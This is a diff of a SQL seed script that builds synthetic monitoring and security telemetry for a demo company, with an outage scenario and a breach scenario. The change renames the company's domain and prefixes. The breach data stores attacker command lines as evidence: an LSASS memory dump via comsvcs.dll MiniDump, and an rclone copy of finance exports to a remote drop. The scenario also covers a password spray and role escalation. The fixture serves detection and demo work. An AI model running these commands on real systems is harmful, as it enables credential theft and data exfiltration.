@@ -70,7 +70,7 @@ SELECT OBJECT_CONSTRUCT(
     'scheduled_start_time', SDP_DT(DATEADD(hour, column4, $s1_t0)),
     'scheduled_end_time', SDP_DT(DATEADD(hour, column4 + 2, $s1_t0)),
     'completed_time', SDP_DT(DATEADD(hour, column4 + column5, $s1_t0)),
-    'change_owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@tacdemo.com'),
+    'change_owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@summitlive.example'),
     'group', OBJECT_CONSTRUCT('name', 'Business Applications'),
     'configuration_items', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('name', 'JDE-SQL01')),
     'reason_for_change', column6,
@@ -102,7 +102,7 @@ SELECT OBJECT_CONSTRUCT(
     'severity', IFF(R(g.i,'s1sev') < 0.7, 4, 3),
     'startEpoch', DATE_PART(epoch_second, DATEADD(minute, 15 + FLOOR(R(g.i,'s1t') * 1800), $s1_t0)),
     'endEpoch', DATE_PART(epoch_second, DATEADD(minute, 15 + FLOOR(R(g.i,'s1t') * 1800) + 30 + FLOOR(R(g.i,'s1d') * 210), $s1_t0)),
-    'cleared', TRUE, 'acked', TRUE, 'ackedBy', 'jordan.patel@tacdemo.com', 'sdted', FALSE,
+    'cleared', TRUE, 'acked', TRUE, 'ackedBy', 'jordan.patel@summitlive.example', 'sdted', FALSE,
     'monitorObjectName', h.hostname,
     'resourceTemplateName', h.datasource, 'instanceName', h.datasource, 'dataPointName', h.datapoint,
     'alertValue', TO_VARCHAR(ROUND(95 + R(g.i,'s1v') * 5, 1)), 'threshold', '> 80 90 95', 'rule', 'Tier 1 Critical'
@@ -203,7 +203,7 @@ WHERE t.person_idx = 5
 INSERT INTO RAW_SDP_WORKLOGS
 SELECT OBJECT_CONSTRUCT(
     'request_id', TO_VARCHAR(2079997959000000 + g.i), 'id', TO_VARCHAR(4900000000 + g.i),
-    'owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@tacdemo.com'),
+    'owner', OBJECT_CONSTRUCT('name', 'Jordan Patel', 'email_id', 'jordan.patel@summitlive.example'),
     'worklog_type', OBJECT_CONSTRUCT('name', 'Troubleshooting'),
     'start_time', SDP_DT(DATEADD(hour, 8, $s1_t0)),
     'end_time', SDP_DT(DATEADD(minute, 480 + 45, $s1_t0)),
@@ -247,7 +247,7 @@ JOIN SEED_FABRIC_ITEMS i ON i.item_name = v.column1;
 -- Capacity spike from full reloads on D-34 / D-33 (throttling interactive users)
 INSERT INTO RAW_FABRIC_CAPACITY_METRICS
 SELECT OBJECT_CONSTRUCT(
-    'capacityName', 'tac-fabric-f64', 'capacitySku', 'F64', 'capacityCUs', 64,
+    'capacityName', 'slg-fabric-f64', 'capacitySku', 'F64', 'capacityCUs', 64,
     'date', TO_VARCHAR(DATEADD(day, v.column2, $demo_end), 'YYYY-MM-DD'),
     'workspaceName', i.workspace_name, 'itemName', i.item_name, 'itemKind', i.item_type,
     'billingType', IFF(i.item_type IN ('Report','Warehouse'), 'Interactive', 'Background'),
@@ -273,7 +273,7 @@ SELECT OBJECT_CONSTRUCT(
     'Operation', IFF(MOD(g.i, 8) = 0, 'RefreshDataset', 'ViewReport'), 'Activity', IFF(MOD(g.i, 8) = 0, 'RefreshDataset', 'ViewReport'),
     'Workload', 'PowerBI', 'UserType', 0, 'UserId', p.email, 'UserKey', TO_VARCHAR(100320000 + p.person_idx),
     'ClientIP', '203.0.113.' || (10 + MOD(p.person_idx, 40)),
-    'WorkSpaceName', 'TAC-Finance-Reporting', 'ReportName', 'Finance - GL Summary', 'DatasetName', 'SM_Finance_GL',
+    'WorkSpaceName', 'SLG-Finance-Reporting', 'ReportName', 'Finance - GL Summary', 'DatasetName', 'SM_Finance_GL',
     'ItemName', 'Finance - GL Summary', 'ConsumptionMethod', 'Power BI Web', 'DistributionMethod', 'App'
   ), 'scenario:s1_outage', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
 FROM (SELECT SEQ4() AS i FROM TABLE(GENERATOR(ROWCOUNT => 80))) g
@@ -288,7 +288,7 @@ INSERT INTO RAW_ENTRA_SIGNINS
 SELECT OBJECT_CONSTRUCT(
     'id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2spray-' || g.i),
     'createdDateTime', ISO_TS(DATEADD(second, FLOOR(R(g.i,'s2t') * 10800), $s2_spray)),
-    'userPrincipalName', IFF(MOD(g.i, 84) = 0, 'svc_jde_integration@tacdemo.com', p.email),
+    'userPrincipalName', IFF(MOD(g.i, 84) = 0, 'svc_jde_integration@summitlive.example', p.email),
     'userDisplayName', IFF(MOD(g.i, 84) = 0, 'svc JDE Integration', p.full_name),
     'appDisplayName', 'Office 365 Exchange Online',
     'ipAddress', '185.220.101.' || (1 + MOD(g.i, 60)),
@@ -312,7 +312,7 @@ INSERT INTO RAW_ENTRA_SIGNINS
 SELECT OBJECT_CONSTRUCT(
     'id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2login-' || column1),
     'createdDateTime', ISO_TS(column2::TIMESTAMP_NTZ),
-    'userPrincipalName', 'svc_jde_integration@tacdemo.com', 'userDisplayName', 'svc JDE Integration',
+    'userPrincipalName', 'svc_jde_integration@summitlive.example', 'userDisplayName', 'svc JDE Integration',
     'appDisplayName', column3, 'ipAddress', $attacker_ip, 'clientAppUsed', 'Other clients', 'isInteractive', TRUE,
     'conditionalAccessStatus', 'notApplied', 'authenticationRequirement', 'singleFactorAuthentication',
     'riskLevelDuringSignIn', column4, 'status', OBJECT_CONSTRUCT('errorCode', 0),
@@ -332,7 +332,7 @@ SELECT OBJECT_CONSTRUCT(
     'id', 'Directory_' || UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2audit-' || column1),
     'activityDateTime', ISO_TS(column2::TIMESTAMP_NTZ), 'activityDisplayName', column3,
     'category', column4, 'result', 'success',
-    'initiatedBy', OBJECT_CONSTRUCT('user', OBJECT_CONSTRUCT('userPrincipalName', 'svc_jde_integration@tacdemo.com', 'ipAddress', $attacker_ip)),
+    'initiatedBy', OBJECT_CONSTRUCT('user', OBJECT_CONSTRUCT('userPrincipalName', 'svc_jde_integration@summitlive.example', 'ipAddress', $attacker_ip)),
     'targetResources', ARRAY_CONSTRUCT(OBJECT_CONSTRUCT('displayName', column5, 'type', column6))
   ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
 FROM VALUES
@@ -342,8 +342,8 @@ FROM VALUES
 INSERT INTO RAW_AZURE_ACTIVITY
 SELECT OBJECT_CONSTRUCT(
     'TimeGenerated', ISO_TS(column1::TIMESTAMP_NTZ), 'OperationNameValue', column2, 'ActivityStatusValue', 'Success',
-    'CategoryValue', 'Administrative', 'Caller', 'svc_jde_integration@tacdemo.com', 'CallerIpAddress', $attacker_ip,
-    'ResourceGroup', column3, '_ResourceId', '/subscriptions/0000-tac/resourceGroups/' || column3 || '/providers/' || column4
+    'CategoryValue', 'Administrative', 'Caller', 'svc_jde_integration@summitlive.example', 'CallerIpAddress', $attacker_ip,
+    'ResourceGroup', column3, '_ResourceId', '/subscriptions/0000-slg/resourceGroups/' || column3 || '/providers/' || column4
   ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
 FROM VALUES
   (DATEADD(minute, 9, $s2_escal), 'Microsoft.Authorization/roleAssignments/write', 'rg-jde-prod', 'Microsoft.Authorization/roleAssignments/contributor-svc_jde_integration'),
@@ -359,7 +359,7 @@ SELECT OBJECT_CONSTRUCT(
     'AttackTechniques', column5,
     'Evidence', ARRAY_CONSTRUCT(
         OBJECT_CONSTRUCT('EntityType','Machine','EvidenceRole','Impacted','DeviceName','JDE-APP02'),
-        OBJECT_CONSTRUCT('EntityType','User','EvidenceRole','Impacted','AccountUpn','svc_jde_integration@tacdemo.com'),
+        OBJECT_CONSTRUCT('EntityType','User','EvidenceRole','Impacted','AccountUpn','svc_jde_integration@summitlive.example'),
         OBJECT_CONSTRUCT('EntityType','Process','EvidenceRole','Related','FileName', column6, 'ProcessCommandLine', column7),
         OBJECT_CONSTRUCT('EntityType','Ip','EvidenceRole','Related','RemoteIP', $attacker_ip))
   ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
@@ -369,13 +369,13 @@ FROM VALUES
   (DATEADD(minute, 24, $s2_exec), 'da000000900002', 'Possible credential dumping via LSASS memory access', 'CredentialAccess', '["LSASS Memory (T1003.001)"]',
    'rundll32.exe', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Windows\\Temp\\ls.dmp full'),
   (DATEADD(minute, 35, $s2_exfil), 'da000000900003', 'Possible data exfiltration to cloud storage', 'Exfiltration', '["Exfiltration to Cloud Storage (T1567.002)"]',
-   'rclone.exe', 'rclone.exe copy C:\\Windows\\Temp\\gl_export remote:tac-drop --transfers 16');
+   'rclone.exe', 'rclone.exe copy C:\\Windows\\Temp\\gl_export remote:slg-drop --transfers 16');
 
 -- Bulk reads from the Fabric CDW gold warehouse with the stolen service account
 INSERT INTO RAW_FABRIC_WAREHOUSE_QUERIES
 SELECT OBJECT_CONSTRUCT(
     'distributed_statement_id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2whq-' || column1),
-    'session_id', 777, 'login_name', 'svc_jde_integration@tacdemo.com', 'program_name', 'python (pyodbc)',
+    'session_id', 777, 'login_name', 'svc_jde_integration@summitlive.example', 'program_name', 'python (pyodbc)',
     'start_time', ISO_TS(DATEADD(minute, column1 * 4, $s2_exfil)),
     'end_time', ISO_TS(DATEADD(millisecond, column3, DATEADD(minute, column1 * 4, $s2_exfil))),
     'total_elapsed_time_ms', column3, 'status', 'Succeeded', 'row_count', column4,
@@ -394,9 +394,9 @@ SELECT OBJECT_CONSTRUCT(
     'Id', UUID_STRING('6ba7b810-9dad-11d1-80b4-00c04fd430c8', 's2pbi-' || column1),
     'RecordType', 20, 'CreationTime', ISO_TS(DATEADD(minute, 14 + column1 * 3, $s2_exfil)),
     'Operation', 'ExportReport', 'Activity', 'ExportReport', 'Workload', 'PowerBI', 'UserType', 0,
-    'UserId', 'svc_jde_integration@tacdemo.com', 'UserKey', '100329999', 'ClientIP', $attacker_ip,
+    'UserId', 'svc_jde_integration@summitlive.example', 'UserKey', '100329999', 'ClientIP', $attacker_ip,
     'UserAgent', 'python-requests/2.31',
-    'WorkSpaceName', 'TAC-Finance-Reporting', 'ReportName', column2, 'DatasetName', column3, 'ItemName', column2,
+    'WorkSpaceName', 'SLG-Finance-Reporting', 'ReportName', column2, 'DatasetName', column3, 'ItemName', column2,
     'ConsumptionMethod', 'Power BI REST API', 'DistributionMethod', 'Workspace',
     'ExportedArtifactInfo', OBJECT_CONSTRUCT('ExportType', 'CSV', 'ArtifactType', 'Report', 'ArtifactId', 1),
     'RowCount', column4
@@ -414,11 +414,11 @@ SELECT OBJECT_CONSTRUCT(
   ), 'scenario:s2_breach', CURRENT_TIMESTAMP()::TIMESTAMP_NTZ
 FROM VALUES
   ('s2-alert-spray', DATEADD(hour, 3, $s2_spray), 'Password Spray', 'Medium', 'IPC', 'Azure Active Directory Identity Protection', 'CredentialAccess', '["T1110.003"]', 'multiple users'),
-  ('s2-alert-unfamiliar', DATEADD(minute, 5, $s2_login), 'Unfamiliar sign-in properties', 'Medium', 'IPC', 'Azure Active Directory Identity Protection', 'InitialAccess', '["T1078"]', 'svc_jde_integration@tacdemo.com'),
+  ('s2-alert-unfamiliar', DATEADD(minute, 5, $s2_login), 'Unfamiliar sign-in properties', 'Medium', 'IPC', 'Azure Active Directory Identity Protection', 'InitialAccess', '["T1078"]', 'svc_jde_integration@summitlive.example'),
   ('s2-alert-ps', DATEADD(minute, 11, $s2_exec), 'Suspicious PowerShell command line', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'Execution', '["T1059.001"]', 'JDE-APP02'),
   ('s2-alert-lsass', DATEADD(minute, 25, $s2_exec), 'Possible credential dumping via LSASS memory access', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'CredentialAccess', '["T1003.001"]', 'JDE-APP02'),
-  ('s2-alert-whread', DATEADD(minute, 25, $s2_exfil), 'Unusual volume of data read from Fabric warehouse WH_CDW_Gold', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Collection', '["T1213"]', 'svc_jde_integration@tacdemo.com'),
-  ('s2-alert-pbiexport', DATEADD(minute, 30, $s2_exfil), 'Mass export of Power BI reports from anonymous IP', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Exfiltration', '["T1567"]', 'svc_jde_integration@tacdemo.com'),
+  ('s2-alert-whread', DATEADD(minute, 25, $s2_exfil), 'Unusual volume of data read from Fabric warehouse WH_CDW_Gold', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Collection', '["T1213"]', 'svc_jde_integration@summitlive.example'),
+  ('s2-alert-pbiexport', DATEADD(minute, 30, $s2_exfil), 'Mass export of Power BI reports from anonymous IP', 'High', 'ASI Scheduled Alerts', 'Azure Sentinel', 'Exfiltration', '["T1567"]', 'svc_jde_integration@summitlive.example'),
   ('s2-alert-exfil', DATEADD(minute, 36, $s2_exfil), 'Possible data exfiltration to cloud storage', 'High', 'MDATP', 'Microsoft Defender Advanced Threat Protection', 'Exfiltration', '["T1567.002"]', 'JDE-APP02');
 
 INSERT INTO RAW_SENTINEL_INCIDENTS
@@ -439,7 +439,7 @@ FROM VALUES
    'Service account; expected automation traffic. Closing.', 'MSSP SOC Tier 1',
    $s2_login, DATEADD(hour, 30, $s2_login), '["s2-alert-unfamiliar"]', '["InitialAccess"]'),
   (4127, 'Multi-stage incident involving Execution, Credential access and Exfiltration on JDE-APP02 and Fabric CDW', DATEADD(minute, 40, $s2_exfil), 'High', 'TruePositive',
-   'Confirmed compromise of svc_jde_integration. Account disabled, credentials rotated, JDE-APP02 isolated.', 'TAC Security + MSSP SOC Tier 2',
+   'Confirmed compromise of svc_jde_integration. Account disabled, credentials rotated, JDE-APP02 isolated.', 'SLG Security + MSSP SOC Tier 2',
    $s2_exec, DATEADD(hour, 70, $s2_exfil),
    '["s2-alert-ps","s2-alert-lsass","s2-alert-whread","s2-alert-pbiexport","s2-alert-exfil"]', '["Execution","CredentialAccess","Collection","Exfiltration"]');
 
